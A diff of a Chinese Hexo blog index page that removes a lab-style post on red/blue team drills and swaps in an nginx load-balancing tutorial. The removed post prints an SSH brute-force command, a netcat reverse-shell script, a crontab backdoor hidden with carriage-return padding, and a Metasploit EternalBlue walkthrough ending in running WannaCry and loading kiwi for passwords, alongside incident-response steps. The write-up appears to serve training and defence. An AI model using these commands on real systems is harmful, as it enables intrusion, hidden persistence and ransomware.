@@ -152,83 +152,64 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-护网行动" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-nginx" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="护网行动"><a href="#护网行动" class="headerlink" title="护网行动"></a>护网行动</h1><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="一-ssh是什么"><a href="#一-ssh是什么" class="headerlink" title="一.ssh是什么"></a>一.ssh是什么</h3><p>​         安全外壳协议：ssh  一种加密的网络传输协议</p>
-<p>​		用途：远程登陆系统</p>
-<p>​		xshell    	</p>
-<h3 id="二-常见端口对应的服务"><a href="#二-常见端口对应的服务" class="headerlink" title="二.常见端口对应的服务"></a>二.常见端口对应的服务</h3><p>22         ssh</p>
-<p>445       smb   (著名漏洞：ms17-010 永恒之蓝)</p>
-<p>3306     MySQL</p>
-<p>3389	 rdp远程桌面连接服务</p>
-<p>80		  http</p>
-<p>443		https</p>
-<h3 id="三-SSH爆破"><a href="#三-SSH爆破" class="headerlink" title="三.SSH爆破"></a>三.SSH爆破</h3><h4 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h4><p>使用nmap扫描目标主机端口：nmap + ip</p>
-<h4 id="2-爆破SSH"><a href="#2-爆破SSH" class="headerlink" title="2.爆破SSH"></a>2.爆破SSH</h4><p>​	使用hydra(九头蛇）进行爆破</p>
-<p>​	hydra -L users.txt -P password.txt  ssh:&#x2F;&#x2F;ip</p>
-<h4 id="3-SSH登录"><a href="#3-SSH登录" class="headerlink" title="3.SSH登录"></a>3.SSH登录</h4><p>ssh 用户名@ip</p>
-<h4 id="4-尝试创建隐藏计划任务（权限维持）"><a href="#4-尝试创建隐藏计划任务（权限维持）" class="headerlink" title="4.尝试创建隐藏计划任务（权限维持）"></a>4.尝试创建隐藏计划任务（权限维持）</h4><p>​	进入 &#x2F;tmp 目录创建 task.sh 文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">nc ip 端口（<span class="number">7777</span>） -e /bin /bash</span><br></pre></td></tr></table></figure>
+        <p><strong>nginx 负载均衡策略：</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>名称</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>轮询</td>
+<td>默认方式</td>
+</tr>
+<tr>
+<td>weight</td>
+<td>权重方式，默认为1，权重越高，被分配的客户端请求就越多</td>
+</tr>
+<tr>
+<td>ip_hash</td>
+<td>依据ip分配方式，这样每个访客可以固定访问一个后端服务</td>
+</tr>
+<tr>
+<td>least_conn</td>
+<td>依据最少连接方式，把请求优先分配给连接数少的后端服务</td>
+</tr>
+<tr>
+<td>url_hash</td>
+<td>依据url分配方式，这样相同的url会被分配到同一个后端服务</td>
+</tr>
+<tr>
+<td>fair</td>
+<td>依据响应时间方式，响应时间短的服务将会被优先分配</td>
+</tr>
+</tbody></table>
+<p>具体配置方式：</p>
+<p><strong>轮询：</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers&#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>​	创建create_task.sh</p>
-<p>​	</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;printf <span class="string">&quot;* * * * * /tmp/task.sh;\rno crontw-web for `whoami`%100c\n&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>
+<p><strong>weight:</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers&#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span> weight=<span class="number">90</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span> weight=<span class="number">10</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="5-尝试nc连接目标主机的shell"><a href="#5-尝试nc连接目标主机的shell" class="headerlink" title="5.尝试nc连接目标主机的shell"></a>5.尝试nc连接目标主机的shell</h4><p>​			nc -lvp 7777</p>
-<h3 id="四-SSH端口爆破的应急响应方案"><a href="#四-SSH端口爆破的应急响应方案" class="headerlink" title="四.SSH端口爆破的应急响应方案"></a>四.SSH端口爆破的应急响应方案</h3><h4 id="事件排查"><a href="#事件排查" class="headerlink" title="事件排查"></a>事件排查</h4><h5 id="1-查看网络连接的情况"><a href="#1-查看网络连接的情况" class="headerlink" title="1.查看网络连接的情况"></a>1.查看网络连接的情况</h5><p>​     netstat -antpl  </p>
-<p>​	发现异常连接               &#x2F;bash</p>
-<h5 id="2-查看守护进程"><a href="#2-查看守护进程" class="headerlink" title="2.查看守护进程"></a>2.查看守护进程</h5><p>​	查看进程树：pstree -p</p>
-<p>​	查看进程：systemctl status pid</p>
-<p>​	发现计划任务</p>
-<h5 id="3-查看计划任务"><a href="#3-查看计划任务" class="headerlink" title="3.查看计划任务"></a>3.查看计划任务</h5><p>​	crontab -l : 未发现有计划任务，可能是隐藏计划任务</p>
-<p>​	查看 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs 下的任务</p>
-<p>​	使用 cat -A root 或者 cat -vET root :可以看到隐藏内容或者vim root ：直接编辑也可以看到具体任务内容</p>
-<h5 id="4-找到task-sh-文件"><a href="#4-找到task-sh-文件" class="headerlink" title="4.找到task.sh 文件"></a>4.找到task.sh 文件</h5><p>​	ls -l &#x2F;tmp&#x2F;task.sh :查看文件上传时间</p>
-<p>​	cat &#x2F;tmp&#x2F;task.sh :查看文件内容，发现是通过nc 反弹shell</p>
-<h4 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h4><h5 id="1-分析任务文件-task-sh"><a href="#1-分析任务文件-task-sh" class="headerlink" title="1.分析任务文件 task.sh"></a>1.分析任务文件 task.sh</h5><h6 id="（1）查看文件上传时间：ls-l-x2F-tmp-x2F-task-sh"><a href="#（1）查看文件上传时间：ls-l-x2F-tmp-x2F-task-sh" class="headerlink" title="（1）查看文件上传时间：ls -l &#x2F;tmp&#x2F;task.sh"></a>（1）查看文件上传时间：ls -l &#x2F;tmp&#x2F;task.sh</h6><p>​	   发现权限为root，说明攻击者以root账号登陆，很可能root账号密码被爆破</p>
-<h6 id="（2）查看登录日志"><a href="#（2）查看登录日志" class="headerlink" title="（2）查看登录日志"></a>（2）查看登录日志</h6><p>​		last -f &#x2F;var&#x2F;log&#x2F;wtmp  :  kali下登陆成功的日志</p>
-<p>​		last -f &#x2F;var&#x2F;log&#x2F;btmp  :   kali下登录失败的日志，发现大量登录失败的日志</p>
-<h6 id="（3）总结"><a href="#（3）总结" class="headerlink" title="（3）总结"></a>（3）总结</h6><p>​			爆破时间</p>
-<p>​			爆破账户</p>
-<p>​			攻击者ip</p>
-<p>​			成功爆破出系统的root账户密码，并且留crontab隐藏后门，任务执行文件task.sh</p>
-<h4 id="事件处置"><a href="#事件处置" class="headerlink" title="事件处置"></a>事件处置</h4><h5 id="1-删除计划任务，结束异常进程"><a href="#1-删除计划任务，结束异常进程" class="headerlink" title="1.删除计划任务，结束异常进程"></a>1.删除计划任务，结束异常进程</h5><p>​		删除隐藏计划任务：crontab -r -u root</p>
-<p>​		杀掉恶意进程： kill pid</p>
-<h5 id="2-删除恶意文件"><a href="#2-删除恶意文件" class="headerlink" title="2.删除恶意文件"></a>2.删除恶意文件</h5><p>​		rm  文件名</p>
-<h5 id="3-修改密码，关闭root用户远程连接的权限"><a href="#3-修改密码，关闭root用户远程连接的权限" class="headerlink" title="3.修改密码，关闭root用户远程连接的权限"></a>3.修改密码，关闭root用户远程连接的权限</h5><p>​		修改密码 ： passwd root</p>
-<p>​		关闭root用户远程连接的权限： vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config  : 修改PermitRootLogin为no，增强权限控制</p>
-<h5 id="4-修改ssh默认端口"><a href="#4-修改ssh默认端口" class="headerlink" title="4.修改ssh默认端口"></a>4.修改ssh默认端口</h5><p>​		vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p>
-<p>​		将22端口修改成其他端口，并将#删除</p>
-<h2 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h2><h3 id="一-简介"><a href="#一-简介" class="headerlink" title="一.简介"></a>一.简介</h3><p>​		勒索病毒是黑客通过锁屏、加密文件等方式劫持用户文件并以此敲诈用户钱财的恶意软件。黑客利用系统漏洞或通过网络钓鱼，邮件，程序木马，网页挂马等方式，向受害电脑或服务器植入病毒，进以加密硬盘上的文档乃至整个硬盘，之后向受害者索要数额不等的赎金后才予以解密。</p>
-<p>​		通常使用对称加密与非对称加密组合的形式加密，绝大数无法通过技术手段破解，必须拿到解密私钥才能解决，一般无法溯源，危害巨大</p>
-<p>​	常见勒索病毒—-WannaCry  (17年通过ms17_010传播)</p>
-<h3 id="二-模拟攻击"><a href="#二-模拟攻击" class="headerlink" title="二.模拟攻击"></a>二.模拟攻击</h3><h4 id="1-用nmap的漏洞扫描模式"><a href="#1-用nmap的漏洞扫描模式" class="headerlink" title="1.用nmap的漏洞扫描模式"></a>1.用nmap的漏洞扫描模式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln 192.168.178.128</span><br></pre></td></tr></table></figure>
+<p><strong>ip_hash:</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers&#123;</span><br><span class="line">    ip_hash;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="2-打开metasploit"><a href="#2-打开metasploit" class="headerlink" title="2.打开metasploit"></a>2.打开metasploit</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p><strong>least_conn:</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers&#123;</span><br><span class="line">    least_conn;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="3-搜索ms17-010相关模块"><a href="#3-搜索ms17-010相关模块" class="headerlink" title="3.搜索ms17-010相关模块"></a>3.搜索ms17-010相关模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br></pre></td></tr></table></figure>
+<p><strong>url_hash:</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers&#123;</span><br><span class="line">    <span class="attribute">hash</span> &amp;request_uri;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="4-加载扫描模块"><a href="#4-加载扫描模块" class="headerlink" title="4.加载扫描模块"></a>4.加载扫描模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br></pre></td></tr></table></figure>
+<p><strong>fair:</strong></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers&#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span>;</span><br><span class="line">    fair;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h4 id="5-查看配置选项"><a href="#5-查看配置选项" class="headerlink" title="5.查看配置选项"></a>5.查看配置选项</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<h4 id="6-配置目标主机"><a href="#6-配置目标主机" class="headerlink" title="6.配置目标主机"></a>6.配置目标主机</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.xx.xx  </span><br></pre></td></tr></table></figure>
-
-<h4 id="7-开始扫描漏洞，再次证实靶机存在MS17-010漏洞"><a href="#7-开始扫描漏洞，再次证实靶机存在MS17-010漏洞" class="headerlink" title="7.开始扫描漏洞，再次证实靶机存在MS17-010漏洞"></a>7.开始扫描漏洞，再次证实靶机存在MS17-010漏洞</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/run</span><br></pre></td></tr></table></figure>
-
-<h4 id="8-使用永恒之蓝攻击模块：exploit-x2F-windows-x2F-smb-x2F-ms17-010-eternalblue"><a href="#8-使用永恒之蓝攻击模块：exploit-x2F-windows-x2F-smb-x2F-ms17-010-eternalblue" class="headerlink" title="8.使用永恒之蓝攻击模块：exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue"></a>8.使用永恒之蓝攻击模块：exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</h4><p>并设置攻击载荷：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload</span><br></pre></td></tr></table></figure>
-
-<h4 id="9-查看选项并设置rhosts"><a href="#9-查看选项并设置rhosts" class="headerlink" title="9.查看选项并设置rhosts"></a>9.查看选项并设置rhosts</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set rhosts 192.168.xx.xx</span><br></pre></td></tr></table></figure>
-
-<h4 id="10-攻击"><a href="#10-攻击" class="headerlink" title="10.攻击"></a>10.攻击</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/run</span><br></pre></td></tr></table></figure>
-
-<h4 id="11-上传"><a href="#11-上传" class="headerlink" title="11.上传"></a>11.上传</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">捕获屏幕</span><br><span class="line"> meterpreter &gt; screenshot</span><br><span class="line">上传/下载文件</span><br><span class="line">meterpreter &gt; upload hello.txt c://</span><br><span class="line"></span><br><span class="line">pwd  查看当前目录</span><br><span class="line"></span><br><span class="line">执行勒索病毒文件</span><br><span class="line">execute -f wcry.exe</span><br><span class="line"></span><br><span class="line">查看勒索病毒是否运行</span><br><span class="line">ps -ef | grep wcry.exe</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download d://1.txt</span><br><span class="line">远程桌面</span><br><span class="line">meterpreter &gt; run vnc </span><br><span class="line">获取cmd,出现了编码问题</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">获取用户密码</span><br><span class="line">meterpreter &gt; load kiwi </span><br><span class="line">Loading extension kiwi...Success. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="三-应急响应"><a href="#三-应急响应" class="headerlink" title="三.应急响应"></a>三.应急响应</h3><h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4>
       
 
       
@@ -240,7 +221,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2024/12/12/%E6%8A%A4%E7%BD%91%E8%A1%8C%E5%8A%A8/">展开全文 >></a>
+          <a class="article-more-a" href="/2025/01/09/nginx/">展开全文 >></a>
         </p>
       
 
@@ -326,8 +307,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>护网面试</p>
-<h2 id="护网"><a href="#护网" class="headerlink" title="护网"></a>护网</h2><h4 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h4><h5 id="讲一下TOP10有哪些？"><a href="#讲一下TOP10有哪些？" class="headerlink" title="讲一下TOP10有哪些？"></a>讲一下TOP10有哪些？</h5><p>1.失效的访问控制  </p>
+        <h2 id="护网"><a href="#护网" class="headerlink" title="护网"></a>护网</h2><h4 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h4><h5 id="讲一下TOP10有哪些？"><a href="#讲一下TOP10有哪些？" class="headerlink" title="讲一下TOP10有哪些？"></a>讲一下TOP10有哪些？</h5><p>1.失效的访问控制  </p>
 <p>2.加密机制失效</p>
 <p>3.注入（包括跨站脚本攻击XSS和SQL注入等）</p>
 <p>4.不安全设计</p>
@@ -1924,7 +1904,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2024 John Doe
+    		&copy; 2025 John Doe
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
